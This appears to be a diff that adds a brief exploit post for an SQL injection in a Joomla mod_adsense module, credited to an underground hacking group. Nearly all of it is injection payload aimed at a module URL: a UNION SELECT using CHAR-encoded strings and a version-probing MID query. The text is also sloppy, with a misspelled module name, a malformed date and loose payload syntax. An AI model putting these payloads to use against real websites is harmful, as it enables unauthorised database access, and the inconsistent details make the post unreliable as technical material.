@@ -1,0 +1,21 @@
+*************************************************************************************
+# Exploit Title: Joomla mod_adsebse modules SQL Injection Vulnerability
+# Date: 2011-29-10
+
+# Author: longrifle0x
+
+# software: Joomla
+
+# Tools: SQLMAP
+
+# Exploit: id=-1; or 1=if
+
+*************************************************************************************
+http://localhost/modules/mod_adsense/mod_adsense.php
+http://localhost/modules/mod_adsense/mod_adsense.php [GET][id=-1]UNION ALL
+SELECT 1, 2, 3,
+CONCAT_WS(CHAR(58,106,97,115,58),CHAR(110,76,105,102,69,111,79,87,114,97),CHAR(58,111,99,109,58))#---
+http://localhost/modules/mod_adsense/mod_adsense.php[GET][id=-1][MID((VERSION()),1,6)
+
+                                                              ....Respect
+Georgian UnderGround Community
